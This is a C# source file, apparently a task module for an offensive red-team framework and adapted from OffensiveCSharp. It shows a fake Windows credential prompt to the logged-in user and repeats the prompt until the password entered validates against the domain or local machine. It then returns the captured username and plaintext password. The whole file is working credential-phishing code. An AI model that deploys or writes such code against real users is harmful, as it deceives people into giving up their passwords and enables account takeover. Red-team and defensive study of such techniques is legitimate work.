////Built from the following code https://github.com/matterpreter/OffensiveCSharp
///Modified to keep prompting user till creds are valid and also handle error cases.
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Net;
using System.DirectoryServices.AccountManagement;


public class Task
{
    [DllImport("ole32.dll")]
    public static extern void CoTaskMemFree(IntPtr ptr);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct CREDUI_INFO
    {
        public int cbSize;
        public IntPtr hwndParent;
        public string pszMessageText;
        public string pszCaptionText;
        public IntPtr hbmBanner;
    }

    [DllImport("credui.dll", CharSet = CharSet.Auto)]
    private static extern bool CredUnPackAuthenticationBuffer(int dwFlags,
        IntPtr pAuthBuffer,
        uint cbAuthBuffer,
        StringBuilder pszUserName,
        ref int pcchMaxUserName,
        StringBuilder pszDomainName,
        ref int pcchMaxDomainame,
        StringBuilder pszPassword,
        ref int pcchMaxPassword);

    [DllImport("credui.dll", CharSet = CharSet.Auto)]
    private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,
        int authError,
        ref uint authPackage,
        IntPtr InAuthBuffer,
        uint InAuthBufferSize,
        out IntPtr refOutAuthBuffer,
        out uint refOutAuthBufferSize,
        ref bool fSave,
        int flags);

    public static void Collector(string message, out NetworkCredential networkCredential)
    {
        CREDUI_INFO credui = new CREDUI_INFO();
        //This block collects the current username and prompts them. This is easily modifiable.
        string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        credui.pszCaptionText = message;
        credui.pszMessageText = "Please enter the credentials for " + username;
        credui.cbSize = Marshal.SizeOf(credui);
        uint authPackage = 0;
        IntPtr outCredBuffer = new IntPtr();
        uint outCredSize;
        bool save = false;
        int result = CredUIPromptForWindowsCredentials(ref credui,
            0,
            ref authPackage,
            IntPtr.Zero,
            0,
            out outCredBuffer,
            out outCredSize,
            ref save,
            1);

        var usernameBuf = new StringBuilder(256);
        var passwordBuf = new StringBuilder(256);
        var domainBuf = new StringBuilder(128);

        int maxUserName = 256;
        int maxDomain = 256;
        int maxPassword = 128;
        if (result == 0)
        {
            if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName,
                domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
            {
                CoTaskMemFree(outCredBuffer);
                networkCredential = new NetworkCredential()
                {
                    UserName = usernameBuf.ToString(),
                    Password = passwordBuf.ToString(),
                    Domain = domainBuf.ToString()
                };
                return;
            }
        }
        networkCredential = null;
    }

    public static string Execute(string message)
    {

        try
        {
            bool valid = false;
            PrincipalContext pcon = null;
            bool domainNotAvailable = false;
            while (!valid)
            {
              
               	Collector(message, out NetworkCredential networkCredential);
            

                try
                {
                    pcon = new PrincipalContext(ContextType.Domain);

                }
                catch (NullReferenceException)
                {
                    //return "[-] User exited prompt, retrying";
                    continue;
                }
                //https://stackoverflow.com/questions/48538582/principalcontext-validatecredentials-with-cached-credentials-in-c-sharp
                catch (System.DirectoryServices.AccountManagement.PrincipalServerDownException)
                {
                    domainNotAvailable = true;
                    try
                    {
                        pcon = new PrincipalContext(ContextType.Machine, Environment.MachineName);
                    }
                    catch (Exception ex2)
                    {
                        throw new Exception(ex2.Message);
                    }

                }
                string realUserName = "";
                try {realUserName = !domainNotAvailable ? networkCredential.UserName : $"{networkCredential.Domain}\\{networkCredential.UserName}";} catch (NullReferenceException) {continue;}
                try { valid = pcon.ValidateCredentials(realUserName, networkCredential.Password); } catch (System.DirectoryServices.AccountManagement.PrincipalOperationException) { valid = false; continue; } 
                if (valid & networkCredential.Domain != "")
                {

                    return "[+] Collected Credentials:\r\n" +
                         "Username: " + networkCredential.Domain + "\\" + networkCredential.UserName + "\r\n" +
                         "Password: " + networkCredential.Password;

                }
                else if (valid)
                {
                    return "[+] Collected Credentials:\r\n" +
                        "Username: " + networkCredential.UserName + "\r\n" +
                        "Password: " + networkCredential.Password;
                }
            } return "[+] Just had to be here to prevent error";

        }
        catch (NullReferenceException) { return "hmmm..seems something really bad happened"; }
    } 
}
